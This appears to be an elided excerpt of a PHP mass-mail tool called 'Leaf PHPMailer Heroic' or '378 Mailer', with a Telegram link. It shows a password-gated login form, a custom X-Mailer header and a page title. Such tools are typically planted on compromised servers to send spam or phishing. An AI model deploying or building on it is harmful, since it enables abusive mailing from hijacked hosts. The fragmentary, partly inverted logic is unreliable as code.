...
$leaf['version']="Heroic";
$leaf['website']="https://t.me/378Area";
...
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    ...
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        ...
        print "<pre align=center><form method=post>CUKIMAY: <input type='password' name='pass'><input type='submit' value='>>'></form></pre>";
        exit;        
    }
}
    ...
    public function createHeader()
    {
        ...
        if ($this->XMailer == '') {
            $result .= $this->headerLine(
                'X-Mailer',
                'Leaf PHPMailer Heroic (leafmailer.pw)'
            );
        } else {
...
print '<div class="container col-lg-6">
        <h3><font color="red"><span class="glyphicon glyphicon-fire"></span></font> 378 Mailer <small>'.$leaf['version'].'</small></h3>
